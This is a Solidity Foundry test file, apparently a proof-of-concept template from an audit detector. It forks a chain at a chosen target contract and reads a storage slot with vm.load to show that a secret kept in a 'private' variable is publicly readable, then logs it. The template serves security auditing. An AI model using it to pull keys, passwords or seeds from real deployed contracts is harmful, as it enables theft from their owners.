// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- "Private" secret is readable on-chain
/// @notice Detector: private-secret. `private` is NOT secret -- every
///         storage slot is public to anyone running a node. A secret
///         (key, password, seed) stored in a `private` variable can be
///         read directly with eth_getStorageAt / vm.load.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: set SECRET_SLOT from the target's
///      storage layout (source order / `cast storage` / `forge inspect
///      storage-layout`).

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: storage slot holding the secret (from the target's layout).
    uint256 public constant SECRET_SLOT = 0;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        bytes32 secret = vm.load(target, bytes32(SECRET_SLOT));
        console.log("secret at slot:");
        console.logBytes32(secret);
        assertTrue(secret != bytes32(0), "exploit did not reproduce: slot is empty -- set SECRET_SLOT from the layout");
    }
}
